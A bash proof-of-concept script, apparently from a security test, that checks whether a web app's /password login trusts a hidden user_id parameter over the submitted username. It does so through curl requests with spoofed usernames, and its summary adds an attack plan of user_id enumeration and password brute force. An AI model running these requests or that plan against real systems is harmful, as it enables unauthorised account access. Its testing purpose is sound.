#!/bin/bash

# POC: Authentication Bypass via Hidden user_id Parameter Manipulation
# Demonstrates that authentication validates user_id + password, not username + password

echo "========================================================================"
echo "POC: Authentication Bypass via Hidden user_id Parameter Manipulation"
echo "========================================================================"
echo ""

# Target configuration
TARGET="${TARGET:-http://localhost:8000}"
KNOWN_USER_ID="10032"
KNOWN_PASSWORD="test"
CORRECT_USERNAME="test"

echo "[*] Target: $TARGET"
echo "[*] Known valid credentials: username=test, user_id=10032, password=test"
echo ""

# Test 1: Normal authentication with correct username
echo "========================================="
echo "Test 1: Normal Authentication (Baseline)"
echo "========================================="
echo "[*] Authenticating with correct username 'test', user_id=10032, password=test"

RESPONSE1=$(curl -s -i -X POST "$TARGET/password/$CORRECT_USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$CORRECT_USERNAME&user_id=$KNOWN_USER_ID&password=$KNOWN_PASSWORD" \
  -c /tmp/cookies1.txt \
  2>&1)

if echo "$RESPONSE1" | grep -q "HTTP/[0-9\.]* 302"; then
    LOCATION1=$(echo "$RESPONSE1" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
    echo "[✓] SUCCESS: Authentication successful"
    echo "    Response: 302 Redirect"
    echo "    Location: $LOCATION1"
    
    if [ -f /tmp/cookies1.txt ]; then
        SESSION1=$(grep -i "session" /tmp/cookies1.txt | awk '{print $7}' | head -c 20)
        echo "    Session cookie created: ${SESSION1}..."
    fi
else
    echo "[✗] FAILED: Authentication failed"
fi

echo ""
echo "========================================="
echo "Test 2: Authentication Bypass Attempt 1"
echo "========================================="
echo "[*] Authenticating with DIFFERENT username 'attacker', but same user_id=10032, password=test"

RESPONSE2=$(curl -s -i -X POST "$TARGET/password/$CORRECT_USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&user_id=$KNOWN_USER_ID&password=$KNOWN_PASSWORD" \
  -c /tmp/cookies2.txt \
  2>&1)

if echo "$RESPONSE2" | grep -q "HTTP/[0-9\.]* 302"; then
    LOCATION2=$(echo "$RESPONSE2" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
    echo "[!] VULNERABILITY CONFIRMED: Authentication successful with wrong username!"
    echo "    Submitted username: 'attacker'"
    echo "    Authenticated as user_id: 10032 (test user)"
    echo "    Response: 302 Redirect"
    echo "    Location: $LOCATION2"
    
    if [ -f /tmp/cookies2.txt ]; then
        SESSION2=$(grep -i "session" /tmp/cookies2.txt | awk '{print $7}' | head -c 20)
        echo "    Session cookie created: ${SESSION2}..."
    fi
    
    BYPASS_SUCCESS=true
else
    echo "[✓] PROTECTED: Authentication correctly rejected"
    BYPASS_SUCCESS=false
fi

echo ""
echo "========================================="
echo "Test 3: Authentication Bypass Attempt 2"
echo "========================================="
echo "[*] Authenticating with DIFFERENT username 'admin', but same user_id=10032, password=test"

RESPONSE3=$(curl -s -i -X POST "$TARGET/password/$CORRECT_USERNAME" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&user_id=$KNOWN_USER_ID&password=$KNOWN_PASSWORD" \
  -c /tmp/cookies3.txt \
  2>&1)

if echo "$RESPONSE3" | grep -q "HTTP/[0-9\.]* 302"; then
    LOCATION3=$(echo "$RESPONSE3" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
    echo "[!] VULNERABILITY CONFIRMED: Authentication successful with wrong username!"
    echo "    Submitted username: 'admin'"
    echo "    Authenticated as user_id: 10032 (test user)"
    echo "    Response: 302 Redirect"
    echo "    Location: $LOCATION3"
    
    if [ -f /tmp/cookies3.txt ]; then
        SESSION3=$(grep -i "session" /tmp/cookies3.txt | awk '{print $7}' | head -c 20)
        echo "    Session cookie created: ${SESSION3}..."
    fi
    
    BYPASS_SUCCESS=true
else
    echo "[✓] PROTECTED: Authentication correctly rejected"
fi

echo ""
echo "========================================="
echo "Summary"
echo "========================================="

if [ "$BYPASS_SUCCESS" = true ]; then
    echo "[!] CRITICAL VULNERABILITY CONFIRMED!"
    echo ""
    echo "The application authenticates users based on user_id + password only,"
    echo "completely ignoring the username field. An attacker can:"
    echo "  • Authenticate with ANY username by manipulating the user_id parameter"
    echo "  • Bypass authentication controls by knowing only user_id + password"
    echo "  • Access any account without knowing the correct username"
    echo ""
    echo "Attack scenario:"
    echo "  1. Enumerate valid user_ids (e.g., 1, 10001, 10032)"
    echo "  2. Brute force or obtain password for target user_id"
    echo "  3. Authenticate with arbitrary username + target user_id + password"
    echo "  4. Gain full access to victim's account"
    exit 1
else
    echo "[✓] Application appears to be protected"
    echo "Authentication correctly validates username matches user_id"
    exit 0
fi

# Cleanup
rm -f /tmp/cookies1.txt /tmp/cookies2.txt /tmp/cookies3.txt